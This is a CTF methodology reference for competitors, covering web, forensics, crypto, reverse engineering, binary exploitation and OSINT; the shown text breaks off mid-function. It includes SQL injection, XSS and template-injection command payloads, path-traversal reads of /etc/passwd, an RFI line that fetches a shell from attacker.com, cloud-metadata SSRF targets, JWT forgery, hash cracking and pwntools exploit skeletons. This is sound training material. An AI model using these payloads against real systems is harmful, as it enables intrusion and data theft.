# CTF Methodology Reference

> A comprehensive Capture The Flag (CTF) methodology guide for cybersecurity practitioners and competitors.

---

## Table of Contents

1. [General CTF Strategy](#1-general-ctf-strategy)
2. [Web Challenges](#2-web-challenges)
3. [Forensics Challenges](#3-forensics-challenges)
4. [Cryptography Challenges](#4-cryptography-challenges)
5. [Reverse Engineering](#5-reverse-engineering)
6. [Binary Exploitation (Pwn)](#6-binary-exploitation-pwn)
7. [OSINT Challenges](#7-osint-challenges)
8. [Miscellaneous / Stego](#8-miscellaneous--stego)
9. [CTF Platform Quick Reference](#9-ctf-platform-quick-reference)
10. [Useful One-Liners and Quick Reference](#10-useful-one-liners-and-quick-reference)

---

## 1. General CTF Strategy

### Approaching a CTF

**Triage all challenges first.**
Before diving deep, spend 5–10 minutes reading every challenge title and description. Look for:
- Quick wins (challenges with high solve counts = easier)
- Challenges that match your team's strengths
- Challenges with attachments vs. remote-only (remote means network/web/pwn)
- Point values (higher points = harder)

**Pick your strengths.**
Assign challenges based on individual expertise. A crypto specialist should not spend 3 hours on a web challenge when a web expert is idle. Communicate constantly about who owns what.

**Time-box hard challenges.**
If you have been stuck on a challenge for 45–60 minutes without meaningful progress:
- Write down what you have tried and your current hypothesis
- Hand it off to a teammate or put it on hold
- Return with fresh eyes later
- Do NOT let one hard challenge consume the whole competition

**Flag submission hygiene.**
- Always trim whitespace when submitting flags
- Check the flag format (`CTF{...}`, `flag{...}`, `picoCTF{...}`, etc.) — read the rules
- Submit as soon as you find it; do not batch submits
- Keep a log of flags found even before submitting

### Team Coordination Tips

- Use a shared workspace: Discord, Slack, or a dedicated CTF server
- Maintain a live challenge tracker (Google Sheet or HedgeDoc table) with columns: `Challenge | Category | Owner | Status | Notes`
- Avoid duplicate work — always announce when you start a challenge
- Share partial findings immediately; a 50% solve note can unblock a teammate
- Designate one person to handle flag submission and score tracking
- During long CTFs (24–48 hours), schedule rest rotations so someone is always active
- Keep a shared notes document with all commands run, findings, and dead ends — this saves time when handoffs happen

### Setting Up a CTF Environment

**Note-taking.**
- Obsidian or CherryTree for local, offline markdown notes with challenge trees
- HedgeDoc or HackMD for real-time collaborative team notes
- Joplin for cross-platform sync
- Structure notes: one page per challenge, include: description, files, commands tried, findings, flag

**Tool layout.**
- Use a tiling window manager or tmux to keep terminal, browser, and notes visible simultaneously
- Recommended tmux layout: left pane = work terminal, right pane = notes/reference, bottom = file viewer
- Keep a browser profile specifically for CTFs with all tools bookmarked

**VM Setup.**
- Primary: Kali Linux (most tools pre-installed) or Parrot OS
- Secondary: REMnux (malware/forensics analysis)
- Windows VM: for `.exe` RE, x64dbg, and Windows-specific challenges
- Snapshots: take a clean snapshot before each CTF so you can revert if tools break
- Shared folders or SSH file transfer between host and VMs
- Keep tools updated: `sudo apt update && sudo apt full-upgrade`

### Recommended Universal Tools

| Tool | Purpose | URL |
| --- | --- | --- |
| CyberChef | Encoding, decoding, crypto, data transforms | https://gchq.github.io/CyberChef |
| dcode.fr | Classical cipher identification and solving | https://www.dcode.fr |
| Kali Linux | Full-featured pentest/CTF distro | https://www.kali.org |
| REMnux | Malware and forensics analysis distro | https://remnux.org |
| CyberChef (offline) | Same as above, usable without internet | Download from GitHub releases |

---

## 2. Web Challenges

### Information Gathering

Always start by mapping the attack surface before touching any inputs:

- **`robots.txt`** — often reveals hidden paths (`/admin`, `/backup`, `/secret`)
- **Page source (`Ctrl+U`)** — look for HTML comments, hidden form fields, API endpoints, hardcoded credentials, JS file references
- **JavaScript files** — enumerate all `.js` files; search for API keys, endpoints, authentication logic, and secrets using browser DevTools Sources tab or `grep`
- **Cookies** — inspect all cookies: look for Base64-encoded JSON, JWT tokens, session identifiers that look sequential or guessable
- **HTTP headers** — check `Server`, `X-Powered-By`, `X-Frame-Options`, `Content-Security-Policy` — these reveal the tech stack and misconfigurations
- **Tech stack fingerprinting** — use `whatweb`, Wappalyzer browser extension, or check `generator` meta tags

```bash
# Quick recon one-liner
curl -s -I https://target.com
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
```

### Common Techniques

**SQL Injection (SQLi)**
- Try `'`, `"`, `1'--`, `1' OR '1'='1` in all input fields
- Use `sqlmap` for automated exploitation:
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
# For POST requests:
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
```

**Cross-Site Scripting (XSS)**
- Test all input fields with `<script>alert(1)</script>` and variations
- If filtered, try: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `javascript:alert(1)`
- For blind XSS, use a callback URL (requestbin, interactsh) to confirm execution
- For DOM-based XSS, look in JS source for sinks: `innerHTML`, `eval`, `setTimeout` with user-controlled data — these are dangerous patterns in client-side code that can execute attacker-controlled strings

**Local/Remote File Inclusion (LFI/RFI)**
- Test path traversal: `../../etc/passwd`, `....//....//etc/passwd`
- PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`
- Log poisoning via LFI: inject PHP into User-Agent, then include the log file
- RFI (rare, requires `allow_url_include=On`): `?page=http://attacker.com/shell.php`

**Server-Side Request Forgery (SSRF)**
- Test URL parameters that fetch external resources
- Try: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254` (AWS metadata)
- Bypass filters: `http://127.0.0.1:22`, `http://0x7f000001`, `http://[::1]`
- Cloud metadata endpoints: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP)

**JWT Attacks**
- Decode JWT at jwt.io or with CyberChef
- Try `alg: none` attack: remove signature, set algorithm to `none`
- Try RS256 to HS256 confusion: if you have the public key, sign with it as HMAC secret
- Brute-force weak secrets: `hashcat -a 0 -m 16500 <token> wordlist.txt`
- Check for `kid` header injection (SQL/path traversal in key ID)

**Server-Side Template Injection (SSTI)**
- Test with `{{7*7}}` — if output is `49`, SSTI is confirmed
- Jinja2 (Python): `{{config}}`, `{{''.__class__.__mro__[1].__subclasses__()}}`
- Twig (PHP): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- FreeMarker (Java): `${"freemarker.template.utility.Execute"?new()("id")}`
- Use tplmap for automated exploitation

### IDOR and Broken Access Control

- IDOR (Insecure Direct Object Reference): change numeric IDs in URLs/parameters (`?id=1` → `?id=2`)
- Try accessing `/api/user/2` when logged in as user 1
- Check if user-specific resources are accessible without authentication
- Test horizontal privilege escalation (accessing other users' data) and vertical (accessing admin functions)
- Fuzz object IDs with Burp Intruder or FFUF

### Authentication Bypasses

- **Default credentials**: `admin:admin`, `admin:password`, `admin:123456`, check vendor-specific defaults
- **SQLi login bypass**: `' OR '1'='1' --`, `admin'--`, `' OR 1=1 --`
- **Cookie manipulation**: decode and modify role/admin fields in cookies; re-encode and resend
- **Password reset flaws**: predictable tokens, host header injection in reset links, user enumeration via timing
- **HTTP verb tampering**: try `GET` instead of `POST`, or `PUT`/`DELETE` on restricted endpoints

### Useful Tools

| Tool | Purpose |
| --- | --- |
| Burp Suite (Community) | Intercept, modify, and replay HTTP requests |
| FFUF | Fast web fuzzer for directories, parameters, vhosts |
| Gobuster | Directory and DNS brute-forcing |
| Nikto | Automated web vulnerability scanner |
| whatweb | Tech stack fingerprinting |
| sqlmap | Automated SQL injection exploitation |

```bash
# FFUF directory brute-force
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403

# FFUF subdomain enumeration
ffuf -u http://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200

# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

### General Web Approach

1. Read the challenge description carefully — hints are often there
2. Map all visible endpoints and inputs
3. Identify the tech stack (language, framework, server)
4. Test every input field systematically
5. Check all cookies and tokens
6. Review all JavaScript files
7. Look for hidden endpoints via fuzzing
8. Understand what the application is supposed to do before trying to break it

---

## 3. Forensics Challenges

### File Identification

Before assuming a file is what its extension says, always verify:

```bash
file suspicious_file          # Checks magic bytes, not extension
xxd suspicious_file | head    # Hex dump of first bytes
hexdump -C suspicious_file | head
```

**Common magic bytes:**

| Format | Hex Signature |
| --- | --- |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| JPEG | `FF D8 FF` |
| PDF | `25 50 44 46` (`%PDF`) |
| ZIP | `50 4B 03 04` |
| GIF | `47 49 46 38` (`GIF8`) |
| ELF | `7F 45 4C 46` |
| PE (Windows) | `4D 5A` (`MZ`) |
| 7-Zip | `37 7A BC AF 27 1C` |

**binwalk** — scan for embedded files and file systems:
```bash
binwalk suspicious_file           # List embedded files
binwalk -e suspicious_file        # Extract embedded files
binwalk -Me suspicious_file       # Recursive extraction
```

### Metadata Extraction

```bash
exiftool image.jpg               # Full metadata dump
exiftool -GPS* image.jpg         # GPS coordinates only
strings file.bin | less          # Print all readable strings
strings -n 8 file.bin            # Strings of minimum 8 chars
strings file.bin | grep -i flag  # Grep strings for flag patterns
```

### Disk and Filesystem Analysis

**Autopsy** — GUI forensics platform (recommended for beginners):
- Open disk image (`.dd`, `.img`, `.E01`)
- Run ingest modules: recent activity, keyword search, hash lookup
- Browse file system, deleted files, artifacts, and timeline

**The Sleuth Kit (TSK)** — command-line disk forensics:
```bash
mmls disk.img                    # Show partition layout
fls -r -o 2048 disk.img          # List files recursively (offset from mmls)
icat -o 2048 disk.img 15         # Extract file by inode number
fsstat -o 2048 disk.img          # Filesystem statistics
```

**FTK Imager / FTK Lite** — acquire and examine disk images on Windows.

**ext4 carving** — if filesystem is damaged:
```bash
extundelete disk.img --restore-all
```

### Memory Forensics with Volatility

```bash
# Identify the OS/profile (Volatility 2)
volatility -f memory.raw imageinfo

# Volatility 3 (auto-detects OS)
vol.py -f memory.raw windows.info

# Common Volatility 3 plugins
vol.py -f memory.raw windows.pslist          # Running processes
vol.py -f memory.raw windows.pstree          # Process tree
vol.py -f memory.raw windows.cmdline         # Command line args
vol.py -f memory.raw windows.filescan        # Files in memory
vol.py -f memory.raw windows.dumpfiles --pid 1234  # Dump process files
vol.py -f memory.raw windows.netscan         # Network connections
vol.py -f memory.raw windows.malfind         # Suspicious injected code
vol.py -f memory.raw linux.bash              # Bash history (Linux)
```

### Steganography

**steghide** — hides data in JPEG/BMP/WAV/AU:
```bash
steghide info image.jpg          # Check for embedded data
steghide extract -sf image.jpg   # Extract (will prompt for password)
steghide extract -sf image.jpg -p ""  # Try empty password
```

**zsteg** — LSB steganography in PNG and BMP:
```bash
zsteg image.png                  # Try all common methods
zsteg -a image.png               # Try all methods (exhaustive)
zsteg image.png -E "b1,rgb,lsb,xy"  # Specific channel extraction
```

**stegsolve** — GUI tool for image layer analysis:
- Open image, cycle through color planes with arrows
- Analyse → Data Extract for LSB extraction
- Analyse → Frame Browser for animated GIFs

**OpenStego** — GUI steganography for PNG files.

**LSB analysis** — manual approach:
```python
from PIL import Image
img = Image.open("image.png")
pixels = list(img.getdata())
bits = [pixel[0] & 1 for pixel in pixels]  # LSB of red channel
# Convert bits to bytes and decode
```

### Network Capture Analysis

**Wireshark** — primary GUI tool:
- `File → Export Objects → HTTP` to extract transferred files
- Filter examples:
  - `http` — HTTP traffic only
  - `tcp.stream eq 0` — follow TCP stream 0
  - `dns` — DNS queries
  - `ftp-data` — FTP file transfers
  - `frame contains "flag"` — search for flag string
  - `ip.addr == 192.168.1.1` — filter by IP

**tshark** — command-line Wireshark:
```bash
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap -qz io,phs          # Protocol hierarchy stats
tshark -r capture.pcap --export-objects http,./output/
```

**NetworkMiner** — Windows GUI for extracting files, credentials, and artifacts from pcap.

**tcpdump** — capture and filter:
```bash
tcpdump -r capture.pcap -A 'port 80'       # Read and display ASCII
tcpdump -r capture.pcap -w filtered.pcap 'host 10.0.0.1'
```

### File Carving

```bash
# foremost — carve by file type signatures
foremost -i disk.img -o ./output/
foremost -t png,jpg,zip -i disk.img -o ./output/

# scalpel — faster, config-based carving
scalpel disk.img -o ./output/

# photorec — GUI/TUI for carving photos and documents
photorec disk.img
```

---

## 4. Cryptography Challenges

### Classical Ciphers

**Always try dcode.fr first for classical/unknown ciphers.** The cipher identifier at https://www.dcode.fr/cipher-identifier can automatically identify the cipher type.

| Cipher | Key Clue | Attack |
| --- | --- | --- |
| Caesar | Shift by N | Try all 25 shifts or use dcode.fr |
| ROT13 | Common in CTFs | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` or CyberChef |
| Vigenère | Repeating key | Kasiski analysis, IC analysis, dcode.fr |
| Atbash | A↔Z mirror | `tr 'A-Za-z' 'Z-AZa-z'` |
| Rail Fence | Zigzag pattern | dcode.fr rail fence decoder |
| Playfair | 5x5 key square | dcode.fr Playfair decoder |
| Substitution | Random letter mapping | Frequency analysis, quipqiup.com |

```bash
# ROT13 in bash
echo "Uryyb Jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Caesar brute force (Python)
python3 -c "
s = 'Khoor Zruog'
for i in range(26):
    print(i, ''.join(chr((ord(c)-65-i)%26+65) if c.isupper() else chr((ord(c)-97-i)%26+97) if c.islower() else c for c in s))
"
```

### Modern Crypto Weaknesses

**Weak RSA — Low Public Exponent (e=3)**
If `e=3` and the message `m` is small, then `c = m^3` without wrapping, so `m = cube_root(c)`:
```python
from gmpy2 import iroot
m, exact = iroot(c, 3)
if exact:
    print(bytes.fromhex(hex(m)[2:]))
```

**Weak RSA — Common Modulus Attack**
If two ciphertexts use the same modulus `n` but different exponents `e1`, `e2` (with `gcd(e1,e2)=1`):
```python
from sympy import gcdex
s1, s2, _ = gcdex(e1, e2)
m = pow(c1, s1, n) * pow(c2, s2, n) % n
```

**Weak RSA — Small Primes / Factorable N**
- Try factordb.com first: paste `n` and see if it is already factored
- Use `RsaCtfTool`: `python3 RsaCtfTool.py --publickey key.pem --uncipherfile cipher.txt`
- SageMath for advanced factoring: Fermat factorization for close primes

**CBC Bit-Flipping**
Modifying a byte in ciphertext block `i` corrupts block `i` but predictably flips the corresponding byte in block `i+1` plaintext:
- Find offset of target byte in plaintext
- `new_cipher_byte = original_cipher_byte XOR original_plain_byte XOR desired_plain_byte`

**ECB Mode Detection**
ECB encrypts each block independently — identical 16-byte plaintext blocks produce identical ciphertext blocks:
```python
# Detect ECB: submit 48 identical bytes, check for repeated blocks
ct = encrypt(b'A' * 48)
blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
if len(blocks) != len(set(blocks)):
    print("ECB mode detected")
```

**AES-GCM Nonce Reuse**
If two different messages are encrypted with the same nonce and key, XOR the ciphertexts to cancel the keystream. With one known plaintext, recover the other.

**Reused IV in CBC**
If IV is reused and you can control plaintext, mount a chosen-plaintext attack to recover the IV or decrypt arbitrary ciphertexts.

### Hashing Challenges

```bash
# Identify hash type
hash-identifier <hash>
hashid <hash>

# Crack with hashcat
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt      # MD5
hashcat -a 0 -m 100 hash.txt /usr/share/wordlists/rockyou.txt    # SHA1
hashcat -a 0 -m 1400 hash.txt /usr/share/wordlists/rockyou.txt   # SHA256
hashcat -a 3 -m 0 hash.txt '?a?a?a?a?a?a'                        # Brute-force 6 chars

# john the ripper
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Hashcat mode reference (common):**

| Hash | Mode |
| --- | --- |
| MD5 | 0 |
| SHA1 | 100 |
| SHA256 | 1400 |
| SHA512 | 1700 |
| bcrypt | 3200 |
| NTLM | 1000 |
| JWT (HS256) | 16500 |

### Tools

| Tool | Purpose |
| --- | --- |
| pycryptodome | Python crypto library (`from Crypto.Cipher import AES`) |
| SageMath | Mathematical computing for RSA, elliptic curves |
| RsaCtfTool | Automated RSA attacks (wiener, fermat, factor DB, etc.) |
| CyberChef | Encoding chains, AES/DES encrypt/decrypt, hash |
| dcode.fr | Classical cipher solving |
| hashcat | GPU-accelerated password cracking |
| hashid / hash-identifier | Identify hash algorithm from digest |

---

## 5. Reverse Engineering

### Static Analysis

**Start with `strings` and `file`:**
```bash
file binary
strings binary | grep -i flag
strings binary | grep -i pass
strings -n 6 binary | less
```

**Ghidra** (free, NSA-developed):
1. New project → Import file → Auto-analyze (accept defaults)
2. Navigate to `main` in Symbol Tree or search for it
3. Use Decompiler window — right-click variables to rename for clarity
4. Search → Search Memory for flag patterns

**IDA Free** — powerful disassembler, free version for non-commercial use:
- Better than Ghidra for initial navigation in many cases
- `F5` for pseudocode (limited in free version)
- `n` to rename, `y` to retype

**Binary Ninja** — modern RE platform with a free cloud version at cloud.binary.ninja.

**readelf / objdump:**
```bash
readelf -s binary          # Symbol table
readelf -h binary          # ELF header
objdump -d binary          # Disassemble
objdump -M intel -d binary # Intel syntax disassembly
```

### Dynamic Analysis

**GDB with pwndbg (recommended):**
```bash
gdb ./binary
pwndbg> run
pwndbg> break main
pwndbg> break *0x401234    # Break at address
pwndbg> info functions     # List functions
pwndbg> disassemble main   # Disassemble function
pwndbg> x/s 0x402010       # Examine string at address
pwndbg> x/20wx $rsp        # Examine stack
```

**GDB with PEDA** — alternative plugin with pattern tools:
```bash
gdb-peda$ pattern create 200    # Create cyclic pattern
gdb-peda$ pattern offset $rsp   # Find offset
```

**strace / ltrace:**
```bash
strace ./binary             # Trace system calls
ltrace ./binary             # Trace library calls
strace -e openat ./binary   # Only file open syscalls
```

**x64dbg (Windows)** — GUI debugger for Windows PE binaries:
- Set breakpoints on `strcmp`, `memcmp`, check registers at comparison
- Use "Follow in Dump" to inspect memory

### Decompilation Tips

- Ghidra and Cutter (Rizin-based) both offer decompilation
- Always rename variables as you understand them (`local_20` → `user_input`)
- Look for `strcmp`, `memcmp`, `strncmp` calls — these often compare your input to the flag
- Follow the control flow from `main()` down to the input validation logic
- Check for self-modifying code: the binary may decrypt the flag at runtime

### Anti-Debugging Techniques

**ptrace-based anti-debug:**
```c
if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) { exit(1); }
```
- Bypass: patch the `jne`/`je` after the check, or preload a library that intercepts `ptrace`

**Timing checks:**
- Binary measures execution time; if too slow (being debugged), it exits or gives wrong output
- Bypass: NOP the timing check, or use hardware breakpoints (do not affect timing like software breakpoints)

**Other anti-debug:**
- `IsDebuggerPresent()` (Windows) — patch return value or use ScyllaHide plugin in x64dbg
- Checksum of own code — patching instructions will fail the check; patch the check too

### General RE Approach

1. `file` and `checksec` to understand the binary type and protections
2. `strings` to find obvious flags or clues
3. Open in Ghidra/IDA and find `main()`
4. Follow the input: how is user input read, validated, and compared?
5. Identify the comparison: what is your input checked against?
6. If the comparison target is computed (XOR, shift, etc.), reverse the algorithm
7. If the binary runs a keygen-style check, write a solver script

---

## 6. Binary Exploitation (Pwn)

### x86/x64 Calling Conventions and Stack Layout

**x64 Linux (System V AMD64 ABI):**
- Arguments: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, then stack
- Return value: `rax`
- Caller-saved: `rax`, `rcx`, `rdx`, `rsi`, `rdi`, `r8`-`r11`
- Callee-saved: `rbx`, `rbp`, `r12`-`r15`

**Stack frame layout (growing downward):**
```
High addresses
[ previous frames     ]
[ saved rbp           ]  <- rbp points here after function prologue
[ local variable 1    ]
[ local variable 2    ]
[ ...                 ]
[ return address      ]  <- overwrite this for control flow hijack
Low addresses
```

### Finding Vulnerabilities

**checksec:**
```bash
checksec --file=./binary
# Look for: NX (no-exec stack), PIE (ASLR), stack canary, RELRO
```

**pwndbg stack view:**
```
pwndbg> cyclic 200         # Create De Bruijn pattern
pwndbg> run <<< $(cyclic 200)
pwndbg> cyclic -l $rsp     # Find offset after crash
```

### Stack Buffer Overflow

1. Find the offset to the return address using `cyclic` (pwntools) or `pattern_create` (PEDA/Metasploit)
2. Overwrite return address with target (win function, `system("/bin/sh")`, ROP chain)

```python
from pwn import *
p = process('./vulnerable')
# or p = remote('host', port)

offset = 40  # Found via cyclic
win_addr = 0x401234  # Address of win() function

payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

### Return-Oriented Programming (ROP)

Used when NX is enabled (no executable stack) — chain small "gadgets" ending in `ret`.

**Find gadgets:**
```bash
ROPgadget --binary ./binary --rop
ropper -f ./binary
```

**pwntools ROP class:**
```python
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
rop.puts(elf.got['puts'])      # Call puts(puts@GOT) to leak libc address
rop.main()                     # Return to main for second stage
print(rop.dump())

payload = b'A' * offset + rop.chain()
```

**ret2libc (no PIE, known libc):**
```python
# Leak libc base, then call system("/bin/sh")
libc = ELF('./libc.so.6')
rop.puts(elf.got['puts'])
# ... (receive leak, calculate libc base) ...
rop.system(next(libc.search(b'/bin/sh')))
```

### Format String Exploitation

**Reading memory (`%p` leaks):**
```
%p %p %p %p %p %p %p %p    # Print 8 stack values as hex pointers
%7$p                        # Print 7th argument directly
%7$s                        # Print string at address in 7th argument
```

**Arbitrary write (`%n`):**
```python
from pwn import *
# %n writes number of bytes printed so far to the address in the corresponding argument
# pwntools fmtstr_payload automates this:
payload = fmtstr_payload(offset, {target_addr: value_to_write})
```

**Finding the offset:**
```
Send: AAAA.%p.%p.%p.%p.%p
Look for: 0x41414141 in output -> that position is the offset
```

### Heap Exploitation Basics

**Use-After-Free (UAF):**
- Object is freed but pointer is not cleared
- Allocate new object of same size; it lands in the same memory
- Old pointer now points to attacker-controlled data

**Double-Free:**
- Freeing a chunk twice corrupts freelist metadata
- In tcache (glibc 2.27+): first double-free is often detectable via key field; bypass requires clearing key

**Tcache Poison (glibc 2.27–2.31):**
- Overwrite `fd` pointer of freed tcache chunk with target address
- Next two allocations: first returns original chunk, second returns target address
- Write shellcode or function pointer at target

```python
# Tcache poison skeleton
free(chunk_a)
free(chunk_a)                # Double free (or UAF overwrite fd)
# Overwrite chunk_a->fd with &target
malloc(size)                 # Returns chunk_a
malloc(size)                 # Returns target address
```

### Tools

| Tool | Purpose |
| --- | --- |
| pwntools | Python exploit framework (`from pwn import *`) |
| pwndbg | GDB plugin with heap/stack visualization |
| patchelf | Modify ELF binary RPATH/interpreter for custom libc |
| ROPgadget | Find ROP gadgets in binaries |
| ropper | Alternative ROP gadget finder |
| one_gadget | Find single-gadget shell in libc |
| libc-database | Identify libc version from leaked addresses |

```bash
# patchelf usage for custom libc
patchelf --set-interpreter ./ld.so ./binary
patchelf --replace-needed libc.so.6 ./libc.so.6 ./binary

# one_gadget
one_gadget ./libc.so.6
```

---

## 7. OSINT Challenges

### Username Searching

```bash
# Sherlock -- search 300+ platforms
python3 sherlock username
python3 sherlock username --timeout 10 --output results.txt

# WhatsMyName -- web-based or CLI
# https://whatsmyname.app/
```

Common places to check manually: GitHub, Twitter/X, Instagram, Reddit, LinkedIn, Pastebin, HackerNews, TikTok, Steam, Discord servers (if named).

### Image Reverse Search

- **Google Images** — drag and drop image or paste URL; good for common images
- **TinEye** — https://tineye.com — finds exact matches and traces image history
- **Yandex Images** — https://yandex.com/images — best for faces and obscure images, especially non-Western content
- **Bing Visual Search** — sometimes finds results others miss

**Workflow:** Try all four; each has different indexes. Yandex is often the most powerful for CTF geolocation challenges.

### Geolocation

**From an image:**
1. Extract EXIF GPS: `exiftool image.jpg | grep GPS`
2. If no GPS, use visual clues: street signs, license plates, building styles, flora, sun angle
3. **overpass-turbo** (https://overpass-turbo.eu) — query OpenStreetMap for specific features (e.g., find all bus stops with a specific name)
4. **Google Street View** — manually navigate to suspected area; use `pegman` to drop into street view
5. **GeoGuessr clues**: road markings, utility poles, vehicle makes, languages on signs

**Tools for geolocation:**
```
https://overpass-turbo.eu       # OSM query tool
https://www.google.com/maps     # Street View exploration
https://www.bing.com/maps       # Alternative maps
https://www.maxmind.com         # IP geolocation
```

### Social Media and Web History

- **Wayback Machine** (https://web.archive.org) — check historical versions of websites and profiles
- **Google cache** — `cache:target.com` in Google search
- **Cached pages** — search `site:web.archive.org username`
- **LinkedIn** — check employment history, endorsements, connections for clues
- **Pastebin** — search `site:pastebin.com target_username` in Google

### Domain and IP Investigation

```bash
whois domain.com                  # Registrar, registrant, dates
whois 1.2.3.4                     # IP ownership

# dig for DNS records
dig domain.com ANY
dig domain.com MX
dig domain.com TXT
dig -x 1.2.3.4                    # Reverse DNS lookup
```

**Online tools:**

| Tool | Purpose | URL |
| --- | --- | --- |
| Shodan | Search internet-connected devices | https://shodan.io |
| Censys | Certificate and host search | https://search.censys.io |
| VirusTotal | Domain/IP/file reputation | https://virustotal.com |
| SecurityTrails | DNS history, subdomains | https://securitytrails.com |
| crt.sh | Certificate transparency logs | https://crt.sh |

```bash
# Shodan CLI
shodan search "hostname:target.com"
shodan host 1.2.3.4

# subfinder for subdomain enumeration
subfinder -d target.com -o subdomains.txt
```

---

## 8. Miscellaneous / Stego

### Initial Triage Checklist

For any file in a misc/stego challenge:
1. `file <filename>` — verify file type
2. `exiftool <filename>` — check metadata
3. `strings <filename> | grep -i flag` — search for readable strings
4. Check if it is a ZIP/archive disguised with another extension
5. `binwalk <filename>` — look for embedded files
6. XOR the file against common single-byte keys: `python3 -c "d=open('f','rb').read(); [print(hex(k), bytes(b^k for b in d).decode(errors='ignore')) for k in range(256)]"`
7. Check for base encoding in strings output

### Audio Challenges

**Audacity** — open audio file, view spectrogram:
- View → Spectrogram to see frequency spectrum
- Hidden messages are often visible as text/images in the spectrogram
- Change spectrogram settings (View → Spectrogram Settings) for better resolution

```bash
# View spectrogram from command line
sox audio.wav -n spectrogram -o spectrogram.png
```

**DTMF decoding** (phone tones):
- Use online DTMF decoder or `multimon-ng`
```bash
sox audio.wav -r 22050 -c 1 /tmp/audio_mono.wav
multimon-ng -t wav -a DTMF /tmp/audio_mono.wav
```

**Morse code:**
- Listen for dots/dashes in audio
- Use `morse2ascii` or fldigi software modem
- CyberChef has a Morse decode operation

**LSB in audio (WAV):**
```python
import wave
w = wave.open('audio.wav', 'rb')
frames = w.readframes(w.getnframes())
lsbs = bytes([b & 1 for b in frames])
# Convert bitstring to ASCII
```

### Image Stego Deep Dive

**stegsolve workflow:**
1. Open image, cycle through color planes (left/right arrow keys)
2. Look for patterns, hidden text, or QR codes in specific bit planes
3. Analyse → Data Extract: check all bit planes and order combinations
4. Analyse → Steganography for LSB extraction with different parameters
5. Analyse → Frame Browser for animated images

```bash
# zsteg -- PNG/BMP LSB analysis
zsteg image.png                  # Default scan
zsteg -a image.png               # All methods (slow but thorough)

# steghide with password wordlist
stegcracker image.jpg wordlist.txt

# stegseek -- fast steghide cracker
stegseek image.jpg /usr/share/wordlists/rockyou.txt
```

### QR and Barcode Challenges

```bash
# zbarimg -- decode QR codes and barcodes from images
zbarimg qr_code.png
zbarimg --raw image.png          # Raw output

# If zbarimg fails (damaged/stylized QR):
# Use online: https://zxing.org/w/decode.jspx
# Or: https://www.onlinebarcodereader.com/
```

### Encoding Cheat Sheet

| Encoding | Example / Clue | Decode |
| --- | --- | --- |
| Base64 | `SGVsbG8=`, ends with `=`, alphanumeric+`/+` | `base64 -d`, CyberChef |
| Base32 | `JBSWY3DP`, uppercase + `2-7`, ends `=` | `base32 -d`, CyberChef |
| Base58 | Bitcoin-style, no `0 O I l` | CyberChef, Python base58 |
| Hex | `48656c6c6f` | `xxd -r -p`, CyberChef |
| Binary | `01001000 01101001` | CyberChef, Python |
| Morse | `.... .` | CyberChef, dcode.fr |
| Braille | `⠓⠑⠇⠇⠕` | dcode.fr Braille |
| Bacon cipher | `AAABB AABAA` (groups of 5 A/B) | dcode.fr |
| URL encoding | `%48%65%6c%6c%6f` | `python3 -c "import urllib.parse; print(urllib.parse.unquote('...'))"` |
| HTML entities | `&#72;&#101;` | CyberChef, browser console |

**Multi-layer decoding tip:** In CyberChef, use "Magic" operation to automatically detect and chain multiple encodings. Alternatively, try the "Detect File Type" operation if you suspect binary content.

---

## 9. CTF Platform Quick Reference

| Platform | URL | Strengths | Focus Areas |
| --- | --- | --- | --- |
| HackTheBox | https://hackthebox.com | Machines, challenges, tracks, Pro Labs | All categories, career-level difficulty |
| TryHackMe | https://tryhackme.com | Guided rooms, learning paths, browser-based | Beginner-friendly, structured learning |
| PicoCTF | https://picoctf.org | Year-round practice, Carnegie Mellon | Beginner-intermediate, all categories |
| CTFtime | https://ctftime.org | Event calendar, team rankings, archives | Meta-resource, all CTF events |
| pwn.college | https://pwn.college | Depth of pwn curriculum, automated grading | Binary exploitation, systems security |
| OverTheWire | https://overthewire.org | SSH-based wargames, progressive difficulty | Linux basics, networking, web, crypto |
| CryptoHack | https://cryptohack.org | Excellent crypto curriculum, interactive | Cryptography, math-heavy challenges |

**Tips for each:**
- **HackTheBox**: Use the "Starting Point" machines for guided intro; look at retired machines for writeups
- **TryHackMe**: Complete the "Pre-Security" and "Jr Penetration Tester" paths before CTFs
- **PicoCTF**: Great for building fundamentals; picoCTF gym has all past challenges available year-round
- **CTFtime**: Check upcoming CTF events, filter by weight and type; team registration happens here
- **pwn.college**: Work through modules sequentially; the dojos are self-contained and auto-graded
- **OverTheWire**: Start with Bandit (Linux basics) → Leviathan → Natas (web) → Narnia (binary)
- **CryptoHack**: Complete the "Introduction" and "General" sections first; JSON API-based challenges

---

## 10. Useful One-Liners and Quick Reference

### Python Quick Reference

```python
import base64, hashlib, binascii, struct

# Base64
base64.b64encode(b'Hello World')          # Encode
base64.b64decode('SGVsbG8gV29ybGQ=')      # Decode

# Hex
'Hello'.encode().hex()                    # String to hex
bytes.fromhex('48656c6c6f')              # Hex to bytes

# Hashing
hashlib.md5(b'password').hexdigest()
hashlib.sha256(b'data').hexdigest()
hashlib.sha1(b'data').hexdigest()

# XOR
def xor(data, key):
